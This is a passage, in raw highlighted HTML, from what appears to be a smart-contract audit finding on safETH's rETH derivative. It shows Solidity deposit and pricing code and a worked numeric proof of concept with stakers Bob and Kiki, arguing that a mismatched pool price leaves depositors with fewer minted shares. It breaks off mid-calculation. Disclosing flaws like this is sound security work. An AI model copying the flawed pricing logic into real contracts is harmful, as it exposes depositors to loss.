class=\"mtk11\">rethAddress</span><span class=\"mtk1\">()).</span><span class=\"mtk11\">getEthValue</span><span class=\"mtk1\">(</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">() * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// poolCanDeposit(_amount)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">return</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getBalance</span><span class=\"mtk1\">() + </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &lt;=</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMaximumDepositPoolSize</span><span class=\"mtk1\">() &amp;&amp;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">_amount</span><span class=\"mtk1\"> &gt;= </span><span class=\"mtk12\">rocketDAOProtocolSettingsDeposit</span><span class=\"mtk1\">.</span><span class=\"mtk11\">getMinimumDeposit</span><span class=\"mtk1\">();</span></span></span></code></pre>\n<p>Let’s follow what actually happens, for now we have wrong overpriced underlying value of the derivative Reth.</p>\n<p>Next the function calculates the preDepositPrice. l will do the real calculations in the POC, but its easy to assume that if the underlyingValue is overpriced the preDepositPrice will be too based on the calculation below.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"9\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk15\">else</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>Let’s say the user deposits 5e18</p>\n<p>Here comes the real problem, so far the function calculates the local variables as there will be swap to Uniswap.</p>\n<p>As mentioned in the beginning the pool has 100e18 free space, so in the deposit function in Reth, the swap to Uniswap will be ignored as <code>poolCanDeposit(msg.value) == true</code> and the msg.value will be deposited in the rocket pool.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"10\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"11\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">deposit</span><span class=\"mtk1\">() </span><span class=\"mtk11\">external</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">onlyOwner</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// Per RocketPool Docs query addresses each time it is used</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPoolAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketDepositPool&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">RocketDepositPoolInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketDepositPoolInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">rocketDepositPoolAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> (!</span><span class=\"mtk11\">poolCanDeposit</span><span class=\"mtk1\">(</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">)) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">36</span><span class=\"mtk1\">) / </span><span class=\"mtk11\">poolPrice</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">minOut</span><span class=\"mtk1\"> = ((((</span><span class=\"mtk12\">rethPerEth</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) *</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                ((</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">maxSlippage</span><span class=\"mtk1\">))) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">IWETH</span><span class=\"mtk1\">(</span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">).</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">swapExactInputSingleHop</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">W_ETH_ADDRESS</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk11\">rethAddress</span><span class=\"mtk1\">(),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk7\">500</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">minOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amountSwapped</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        } </span><span class=\"mtk15\">else</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETHAddress</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketStorageInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">ROCKET_STORAGE_ADDRESS</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ).</span><span class=\"mtk11\">getAddress</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    </span><span class=\"mtk11\">keccak256</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                        </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodePacked</span><span class=\"mtk1\">(</span><span class=\"mtk8\">&quot;contract.address&quot;</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;rocketTokenRETH&quot;</span><span class=\"mtk1\">)</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                    )</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">RocketTokenRETHInterface</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\"> = </span><span class=\"mtk11\">RocketTokenRETHInterface</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">rocketTokenRETHAddress</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">rocketDepositPool</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rocketTokenRETH</span><span class=\"mtk1\">.</span><span class=\"mtk11\">balanceOf</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> &gt; </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\">, </span><span class=\"mtk8\">&quot;No rETH was minted&quot;</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">rethMinted</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">rethBalance2</span><span class=\"mtk1\"> - </span><span class=\"mtk12\">rethBalance1</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk15\">return</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">rethMinted</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<p>Next the function calculates the “derivativeReceivedEthValue”, this time the function ethPerDerivative(depositAmount) will return the normal price as there is space in the pool. Both “derivativeReceivedEthValue” and “totalStakeValueEth” will be calculated based on the normal price.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"12\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">                </span><span class=\"mtk12\">depositAmount</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            ) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"13\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> += </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<p>If we take the info so far and apply it on the mintAmount calculation below, we know that “totalStakeValueEth” is calculated on the normal price and “preDepositPrice” is calculated on the overpriced pool price. So the user will actually receive less minted shares than he is supposed to get.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"14\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span></code></pre>\n<h3 id=\"proof-of-concept---part-1\" style=\"position:relative;\"><a href=\"#proof-of-concept---part-1\" aria-label=\"proof of concept   part 1 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept - Part 1</h3>\n<p>Will start from the start in order to get the right amounts of “totalSupply” and the Reth balance of derivative.\nSo I can show the issue result in POC Part 2.</p>\n<p>The values below are only made for the example.</p>\n<p>Let’s say we have two stakers - Bob and Kiki each depositing 100e18.</p>\n<p>We have only one derivative which is Reth, so it will have 100% weight.</p>\n<p>Bob deposits 100e18 as the first depositer and receives (99999999999999999932) minted tokens of safETH.</p>\n<p>So far after Bob deposit:</p>\n<p>totalSupply = 99999999999999999932</p>\n<p>Reth derivative balance = 93988463204618701706</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"15\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">0</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// As we have only derivative Reth in the example, it owns all of the weight.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">100e18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1000</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// not applying the deposit fee in rocketPool</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk12\">deposit</span><span class=\"mtk1\">{value: </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\">}();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">93988463204618701706</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">derivative</span><span class=\"mtk1\">.</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) * </span><span class=\"mtk12\">depositAmount</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">93988463204618701706</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint</span><span class=\"mtk1\"> </span><span class=\"mtk12\">derivativeReceivedEthValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\"> </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">totalStakeValueEth</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">mintAmount</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span></span></span></code></pre>\n<p>Kiki deposits 100e18 as well and receives (99999999999999999932) minted tokens of safEth.</p>\n<p>So far after Kiki’s deposit:</p>\n<p>totalSupply = 199999999999999999864;</p>\n<p>Reth derivative balance = 187976926409237403412;</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"16\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// take the info after bob&#39;s deposit and the normal price</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">  = (</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">ethPerDerivative</span><span class=\"mtk1\">(</span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) * </span><span class=\"mtk12\">derivatives</span><span class=\"mtk1\">[</span><span class=\"mtk12\">i</span><span class=\"mtk1\">].</span><span class=\"mtk11\">balance</span><span class=\"mtk1\">()) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">1063960369075232250</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">93988463204618701706</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">; </span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">underlyingValue</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalSupply</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = (</span><span class=\"mtk7\">10</span><span class=\"mtk1\"> ** </span><span class=\"mtk7\">18</span><span class=\"mtk1\"> * </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">) / </span><span class=\"mtk7\">99999999999999999932</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">preDepositPrice</span><span class=\"mtk1\"> = </span><span class=\"mtk7\">1e18</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk3\">// As we have only derivative Reth in the example, it owns all of the weight.</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> * </span><span class=\"mtk12\">weight</span><span class=\"mtk1\">) / </span><span class=\"mtk12\">totalWeight</span><span class=\"mtk1\">;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">ethAmount</span><span class=\"mtk1\"> = (</span><span 